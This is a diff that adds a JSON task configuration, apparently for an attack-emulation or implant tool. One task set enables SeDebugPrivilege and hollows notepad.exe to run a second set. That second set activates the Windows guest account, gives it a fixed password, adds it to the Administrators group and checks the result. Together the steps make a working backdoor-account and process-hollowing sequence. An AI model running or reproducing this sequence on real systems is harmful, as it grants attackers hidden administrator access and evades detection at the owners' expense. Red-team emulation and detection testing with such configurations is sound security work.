@@ -1,0 +1,69 @@
+{
+  "task_sets": {
+    "1": [
+      {
+        "op": "sleep",
+        "ms": 40000
+      },
+      {
+        "op": "run_command",
+        "command": "net user guest /active:yes"
+      },
+      {
+        "op": "sleep",
+        "ms": 2000
+      },
+      {
+        "op": "set_user_password",
+        "username": "guest",
+        "password": "P@$$w0rd!1234"
+      },
+      {
+        "op": "sleep",
+        "ms": 2000
+      },
+      {
+        "op": "add_user_to_localgroup",
+        "server": "",
+        "group": "Administrators",
+        "username": "guest"
+      },
+      {
+        "op": "sleep",
+        "ms": 2000
+      },
+      {
+        "op": "run_command",
+        "command": "whoami"
+      },
+      {
+        "op": "sleep",
+        "ms": 2000
+      },
+      {
+        "op": "run_command",
+        "command": "net user guest"
+      },
+      {
+        "op": "sleep",
+        "ms": 60000
+      }
+    ],
+    "0": [
+      {
+        "op": "enable_privilege",
+        "search": "",
+        "privilege": "SeDebugPrivilege"
+      },
+      {
+        "op": "hollow",
+        "image": "C:\\Windows\\System32\\notepad.exe",
+        "task_id": 1
+      },
+      {
+        "op": "print_var",
+        "var": null
+      }
+    ]
+  }
+}
